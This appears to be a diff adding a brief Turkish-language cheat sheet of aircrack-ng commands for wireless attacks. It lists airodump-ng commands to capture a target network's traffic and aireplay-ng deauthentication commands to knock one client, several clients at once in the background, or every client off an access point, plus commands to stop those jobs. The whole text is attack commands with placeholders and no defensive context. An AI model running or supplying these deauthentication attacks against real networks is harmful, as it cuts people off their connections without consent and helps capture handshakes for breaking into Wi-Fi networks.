@@ -1,0 +1,15 @@
+airodump-ng <interface>
+airodump-ng --bssid <bssid> --channel <channel> -w <kayıt yolu ve adı> <interface>
+Başka bir konsoldan: aireplay-ng --deauth <paket sayısı> -a <modem_mac> -c <target_mac> <interface>
+
+Birden fazla cihaza deauth saldırısı:
+aireplay-ng --deauth <paket sayısı> -a <modem_mac> -c <target_mac> <interface> &> /dev/null& (Bu komutla arka planda çalışır.İstediğimiz kadar cihazı bu şekilde aynı anda deauth saldırısı gerçekleştirebilriz.)
+
+Arka planda çalışan işlemleri görem ve durdurma:
+jobs
+kill %<öldürmek istediğimiz işlemin numarası>
+killall aireplay-ng (Bütün aireplayleri öldürür.)
+
+Tüm cihazları ağdan düşürme:
+aireplay-ng --deauth <paket sayısı> -a <modem_mac> <interface>
+
